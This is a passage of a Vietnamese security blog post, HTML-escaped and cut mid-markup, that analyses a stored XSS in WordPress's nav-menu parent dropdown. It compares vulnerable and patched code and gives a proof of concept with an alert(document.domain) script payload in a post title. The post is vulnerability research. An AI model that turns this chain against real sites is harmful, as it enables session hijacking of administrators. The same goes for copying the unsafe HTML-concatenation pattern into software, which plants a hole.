(vulnerable) và &lt;strong&gt;v6.8.3&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Theme&lt;/strong&gt; - &lt;a href=&#34;https://wordpress.org/themes/astra/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Astra&lt;/strong&gt;&lt;/a&gt;: Theme rất phổ biến với người dùng WordPress, hỗ trợ tạo &lt;strong&gt;nav memu&lt;/strong&gt; nhanh chóng.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;WordPress là phần mềm mã nguồn mở, có kho lưu trữ nằm ở github nên ta có thể tìm đến &lt;a href=&#34;https://github.com/WordPress/WordPress/commit/e5caef19d3e842cc9c8c94621b223a9a696fb5b3&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;commit&lt;/a&gt; liên quan đến sự kiện vá lỗ hổng XSS để quan sát sự thay đổi, hiểu được lỗ hổng xảy ra ở đâu.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Bản lỗi&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;updateParentDropdown : function() {&#xA;    return this.each(function(){&#xA;        var menuItems = $( &amp;#39;#menu-to-edit li&amp;#39; ),&#xA;            parentDropdowns = $( &amp;#39;.edit-menu-item-parent&amp;#39; );&#xA;&#xA;        $.each( parentDropdowns, function() {&#xA;            var parentDropdown = $( this ),&#xA;                $html = &amp;#39;&amp;#39;,&#xA;                $selected = &amp;#39;&amp;#39;,&#xA;                currentItemID = parentDropdown.closest( &amp;#39;li.menu-item&amp;#39; ).find( &amp;#39;.menu-item-data-db-id&amp;#39; ).val(),&#xA;                currentparentID = parentDropdown.closest( &amp;#39;li.menu-item&amp;#39; ).find( &amp;#39;.menu-item-data-parent-id&amp;#39; ).val(),&#xA;                currentItem = parentDropdown.closest( &amp;#39;li.menu-item&amp;#39; ),&#xA;                currentMenuItemChild = currentItem.childMenuItems(),&#xA;                excludeMenuItem = [ currentItemID ];&#xA;&#xA;            if ( currentMenuItemChild.length &amp;gt; 0 ) {&#xA;                $.each( currentMenuItemChild, function(){&#xA;                    var childItem = $(this),&#xA;                        childID = childItem.find( &amp;#39;.menu-item-data-db-id&amp;#39; ).val();&#xA;&#xA;                    excludeMenuItem.push( childID );&#xA;                });&#xA;            }&#xA;&#xA;            if ( currentparentID == 0 ) {&#xA;                $selected = &amp;#39;selected&amp;#39;;&#xA;            }&#xA;&#xA;            $html &amp;#43;= &amp;#39;&amp;lt;option &amp;#39; &amp;#43; $selected &amp;#43; &amp;#39; value=&amp;#34;0&amp;#34;&amp;gt;&amp;#39; &amp;#43; wp.i18n._x( &amp;#39;No Parent&amp;#39;, &amp;#39;menu item without a parent in navigation menu&amp;#39; ) &amp;#43; &amp;#39;&amp;lt;/option&amp;gt;&amp;#39;;&#xA;&#xA;            $.each( menuItems, function() {&#xA;                var menuItem = $(this),&#xA;                $selected = &amp;#39;&amp;#39;,&#xA;                menuID = menuItem.find( &amp;#39;.menu-item-data-db-id&amp;#39; ).val(),&#xA;                menuTitle = menuItem.find( &amp;#39;.edit-menu-item-title&amp;#39; ).val();&#xA;&#xA;                if ( ! excludeMenuItem.includes( menuID ) ) {&#xA;                    if ( currentparentID == menuID ) {&#xA;                        $selected = &amp;#39;selected&amp;#39;;&#xA;                    }&#xA;                    $html &amp;#43;= &amp;#39;&amp;lt;option &amp;#39; &amp;#43; $selected &amp;#43; &amp;#39; value=&amp;#34;&amp;#39; &amp;#43; menuID &amp;#43; &amp;#39;&amp;#34;&amp;gt;&amp;#39; &amp;#43; menuTitle &amp;#43; &amp;#39;&amp;lt;/option&amp;gt;&amp;#39;;&#xA;                }&#xA;            });&#xA;&#xA;            parentDropdown.html( $html );&#xA;        });&#xA;        &#xA;    });&#xA;},&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong phiên bản lỗi, giá trị &lt;code&gt;menuTitle&lt;/code&gt; được chèn vào thẻ &lt;code&gt;&amp;lt;option&amp;gt;&lt;/code&gt; và được hiển thị ra HTML bằng phương thức &lt;a href=&#34;https://api.jquery.com/html/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;html()&lt;/a&gt; của &lt;strong&gt;jQuery&lt;/strong&gt; mà không có bất kỳ cơ chế ngăn chặn XSS nào. Hàm &lt;a href=&#34;https://api.jquery.com/html/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;html()&lt;/a&gt; dùng để thay thế nội dung HTML bên trong phần tử hiện tại, nên nếu &lt;code&gt;menuTitle&lt;/code&gt; chứa mã độc thì mã đó sẽ được thực thi trên trình duyệt.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Bản vá&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;updateParentDropdown : function() {&#xA;    return this.each(function(){&#xA;        var menuItems = $( &amp;#39;#menu-to-edit li&amp;#39; ),&#xA;            parentDropdowns = $( &amp;#39;.edit-menu-item-parent&amp;#39; );&#xA;&#xA;        $.each( parentDropdowns, function() {&#xA;            var parentDropdown = $( this ),&#xA;                currentItemID = parseInt( parentDropdown.closest( &amp;#39;li.menu-item&amp;#39; ).find( &amp;#39;.menu-item-data-db-id&amp;#39; ).val() ),&#xA;                currentParentID = parseInt( parentDropdown.closest( &amp;#39;li.menu-item&amp;#39; ).find( &amp;#39;.menu-item-data-parent-id&amp;#39; ).val() ),&#xA;                currentItem = parentDropdown.closest( &amp;#39;li.menu-item&amp;#39; ),&#xA;                currentMenuItemChild = currentItem.childMenuItems(),&#xA;                excludeMenuItem =  /** @type {number[]} */ [ currentItemID ];&#xA;&#xA;            parentDropdown.empty();&#xA;&#xA;            if ( currentMenuItemChild.length &amp;gt; 0 ) {&#xA;                $.each( currentMenuItemChild, function(){&#xA;                    var childItem = $(this),&#xA;                        childID = parseInt( childItem.find( &amp;#39;.menu-item-data-db-id&amp;#39; ).val() );&#xA;&#xA;                    excludeMenuItem.push( childID );&#xA;                });&#xA;            }&#xA;&#xA;            parentDropdown.append(&#xA;                $( &amp;#39;&amp;lt;option&amp;gt;&amp;#39;, {&#xA;                    value: &amp;#39;0&amp;#39;,&#xA;                    selected: currentParentID === 0,&#xA;                    text: wp.i18n._x( &amp;#39;No Parent&amp;#39;, &amp;#39;menu item without a parent in navigation menu&amp;#39; ),&#xA;                } )&#xA;            );&#xA;&#xA;            $.each( menuItems, function() {&#xA;                var menuItem = $(this),&#xA;                menuID = parseInt( menuItem.find( &amp;#39;.menu-item-data-db-id&amp;#39; ).val() ),&#xA;                menuTitle = menuItem.find( &amp;#39;.edit-menu-item-title&amp;#39; ).val();&#xA;&#xA;                if ( ! excludeMenuItem.includes( menuID ) ) {&#xA;                    parentDropdown.append(&#xA;                        $( &amp;#39;&amp;lt;option&amp;gt;&amp;#39;, {&#xA;                            value: menuID.toString(),&#xA;                            selected: currentParentID === menuID,&#xA;                            text: menuTitle,&#xA;                        } )&#xA;                    );&#xA;                }&#xA;            });&#xA;        });&#xA;        &#xA;    });&#xA;},&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Bản vá đã khắc phục lỗ hổng bằng cách chỉ định rõ &lt;code&gt;menuTitle&lt;/code&gt; được gán vào thuộc tính &lt;code&gt;text&lt;/code&gt; thay vì nội dung HTML.&#xA;Điều này đảm bảo giá trị của &lt;code&gt;menuTitle&lt;/code&gt; được xử lý như văn bản thuần túy, không thể chứa hoặc thực thi mã JavaScript độc hại.&#xA;Nhờ đó, dữ liệu được thêm vào thẻ &lt;code&gt;&amp;lt;option&amp;gt;&lt;/code&gt; hoàn toàn an toàn và loại bỏ khả năng tấn công XSS thông qua giá trị &lt;code&gt;menuTitle&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-11-cve-2025-58674/dif.png&#34;&#xA;    alt=&#34;So sánh sự khác biệt giữa bản lỗi và bản vá&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;So sánh sự khác biệt giữa bản lỗi và bản vá&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Inpsect code trên trình duyệt ta thấy &lt;code&gt;menuItems = #menu-to-edit li&lt;/code&gt; là mảng các thẻ &lt;code&gt;&amp;lt;li&amp;gt;&lt;/code&gt; thuộc thẻ &lt;code&gt;&amp;lt;ul&amp;gt;&lt;/code&gt; có &lt;code&gt;id=menu-to-edit&lt;/code&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-11-cve-2025-58674/viewsource.png&#34;&#xA;    alt=&#34;Inspect code trên trình duyệt&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Inspect code trên trình duyệt&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Hàm &lt;code&gt;updateParentDropdown&lt;/code&gt; sẽ duyệt các thẻ &lt;code&gt;&amp;lt;li&amp;gt;&lt;/code&gt; lấy value của &lt;code&gt;&amp;lt;input&amp;gt;&lt;/code&gt; có class &lt;code&gt;edit-menu-item-title&lt;/code&gt;, gán giá trị đó cho &lt;code&gt;menuTitle&lt;/code&gt; trong thẻ &lt;code&gt;&amp;lt;option&amp;gt;&lt;/code&gt; và hiển thị ra HTML.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-11-cve-2025-58674/viewsource1.png&#34;&#xA;    alt=&#34;Inspect DOM sau khi thêm menu&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Inspect DOM sau khi thêm menu&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;&lt;strong&gt;Trên UI&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-11-cve-2025-58674/UIlist.png&#34;&#xA;    alt=&#34;Hình ảnh hiển thị trên giao diện quản trị&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Hình ảnh hiển thị trên giao diện quản trị&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Trong &lt;a href=&#34;https://github.com/WordPress/WordPress/commit/e5caef19d3e842cc9c8c94621b223a9a696fb5b3&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;commit&lt;/a&gt; có một sửa đổi tưởng chừng là hữu ích, nhưng chả có ích cho quá trình phân tích.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-11-cve-2025-58674/htmlett.png&#34;&#xA;    alt=&#34;HTML entity encode (1)&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;HTML entity encode (1)&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Tôi đã sử dụng &lt;code&gt;//&lt;/code&gt; để comment tất cả các dòng liên quan đến &lt;code&gt;html_entity_decode&lt;/code&gt; của &lt;code&gt;origin_title&lt;/code&gt; nhưng vẫn khai thác được. Trước đó tôi đã đặt debug đến các vị trí này nhưng không có gì xảy ra.&lt;/p&gt;&#xA;&lt;p&gt;Ngoài việc sử dụng comment, tôi đã chọn menu chứa XSS payload và click &lt;kbd&gt;Add to Menu&lt;/kbd&gt;, bắt request bằng &lt;strong&gt;BurpSuite&lt;/strong&gt; để xem giá trị được add có được html entity encode không.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-11-cve-2025-58674/htmlett1.png&#34;&#xA;    alt=&#34;HTML entity encode (2)&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;HTML entity encode (2)&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;&lt;code&gt;menu-item-title&lt;/code&gt; là giá trị lấy thẻ input có name &lt;code&gt;menu-item[-5][menu-item-title]&lt;/code&gt; từ &lt;code&gt;post-title&lt;/code&gt; được &lt;strong&gt;check&lt;/strong&gt; để thêm vào body của request&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;input type=&amp;#34;hidden&amp;#34; class=&amp;#34;menu-item-title&amp;#34; name=&amp;#34;menu-item[-5][menu-item-title]&amp;#34; value=&amp;#34;&amp;lt;script&amp;gt;alert(document.domain)&amp;lt;/script&amp;gt;&amp;#34;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Có 1 điều thú vị ở đây, trình duyệt lấy giá trị đã decode html entity để thêm vào request, biết giá trị từ server trước khi echo ra HTML đã được encode&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-11-cve-2025-58674/htmlett2.png&#34;&#xA;    alt=&#34;Trình duyệt decode HTML entity trước khi gửi&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Trình duyệt decode HTML entity trước khi gửi&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;👉 Browser đã decode html entity trước khi hiển thị ra HTML.&lt;/p&gt;&#xA;&lt;p&gt;Trên DOM, sau khi click &lt;kbd&gt;Add to Menu&lt;/kbd&gt; =&amp;gt; &lt;code&gt;attachTabsPanelListeners&lt;/code&gt; được gọi và thêm giá trị vừa &lt;strong&gt;selected&lt;/strong&gt; vào bottom của menu item.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-11-cve-2025-58674/addbottom.png&#34;&#xA;    alt=&#34;Thêm item vào cuối danh sách menu&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Thêm item vào cuối danh sách menu&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;👉 &lt;code&gt;edit-menu-item-title&lt;/code&gt; có giá trị chứa XSS payload. Hàm &lt;code&gt;updateParentDropdown&lt;/code&gt; sẽ lấy nó gán cho thẻ &lt;code&gt;&amp;lt;option&amp;gt;&lt;/code&gt; =&amp;gt; XSS xảy ra&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;sources--sinks&#34;&gt;&lt;span&gt;Sources &amp;amp; Sinks&lt;/span&gt;&#xA;  &lt;a href=&#34;#sources--sinks&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Source&lt;/strong&gt;: &lt;code&gt;post-title&lt;/code&gt; tiêu đề của post&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Sink&lt;/strong&gt;: &lt;code&gt;parentDropdown.html( $html )&lt;/code&gt; có thể chứa HTML độc hại&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;$html &amp;#43;= &amp;#39;&amp;lt;option &amp;#39; &amp;#43; $selected &amp;#43; &amp;#39; value=&amp;#34;&amp;#39; &amp;#43; menuID &amp;#43; &amp;#39;&amp;#34;&amp;gt;&amp;#39; &amp;#43; menuTitle &amp;#43; &amp;#39;&amp;lt;/option&amp;gt;&amp;#39;;&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;Sử dụng tài khoản author, tạo post có title chứa XSS payload&lt;/li&gt;&#xA;&lt;li&gt;Admin truy cập endpoint &lt;code&gt;wp-admin/nav-menus.php&lt;/code&gt; và thực hiện add menus từ post vừa tạo&lt;/li&gt;&#xA;&lt;li&gt;Sự kiện Javascript được kích hoạt&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-11-cve-2025-58674/xss.png&#34;&#xA;    alt=&#34;Proof of Concept: XSS&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Proof of Concept: XSS&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;Thẻ &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; nằm trong &lt;code&gt;&amp;lt;option&amp;gt;&lt;/code&gt; thuộc &lt;code&gt;&amp;lt;select&amp;gt;&lt;/code&gt; có thể thực thi được nhưng các thẻ khác thì không, chỉ trả về text chứa trong đó.&#xA;{: .prompt-info }&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Khi browser parse chuỗi HTML, &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; không nằm trong flow &lt;code&gt;&amp;lt;option&amp;gt;&lt;/code&gt; thực sự mà parser “nhấc” script ra khỏi &lt;code&gt;&amp;lt;option&amp;gt;&lt;/code&gt; và đưa vào DOM tree.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;select name=&amp;#34;&amp;#34; id=&amp;#34;&amp;#34;&amp;gt;&#xA;    &amp;lt;option value=&amp;#34;&amp;#34;&amp;gt;abc&amp;lt;/option&amp;gt;&#xA;    &amp;lt;option value=&amp;#34;&amp;#34;&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;lt;/option&amp;gt;&#xA;&amp;lt;/select&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Vì thế, script thực thi ngay, còn &lt;code&gt;&amp;lt;option&amp;gt;&lt;/code&gt; vẫn tồn tại, nhưng nội dung &lt;code&gt;&amp;lt;option&amp;gt;&lt;/code&gt; trống hoặc hiển thị text rỗng.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-11-cve-2025-58674/inspect1.png&#34;&#xA;    alt=&#34;Inspect DOM sau khi script được tách&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Inspect DOM sau khi script được tách&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Đối với các thẻ khác&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;select name=&amp;#34;&amp;#34; id=&amp;#34;&amp;#34;&amp;gt;&#xA;&#x9;&amp;lt;option value=&amp;#34;&amp;#34;&amp;gt;abc&amp;lt;/option&amp;gt;&#xA;&#x9;&amp;lt;option value=&amp;#34;&amp;#34;&amp;gt;&amp;lt;b&amp;gt;abd&amp;lt;/b&amp;gt;&amp;lt;/option&amp;gt;&#xA;&amp;lt;/select&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Browser tuân thủ spec: &lt;code&gt;&amp;lt;option&amp;gt;&lt;/code&gt; chỉ chứa text-only.&lt;/li&gt;&#xA;&lt;li&gt;Khi parse &lt;code&gt;&amp;lt;b&amp;gt;&lt;/code&gt; hoặc &lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt; trong &lt;code&gt;&amp;lt;option&amp;gt;&lt;/code&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;&amp;lt;b&amp;gt;&lt;/code&gt; bị coi là text =&amp;gt; mất tag, chỉ hiển thị abd như text.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt; bị loại bỏ hoàn toàn.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-11-cve-2025-58674/inspect2.png&#34;&#xA;    alt=&#34;Inspect: render option với thẻ inline&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Inspect: render option với thẻ inline&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 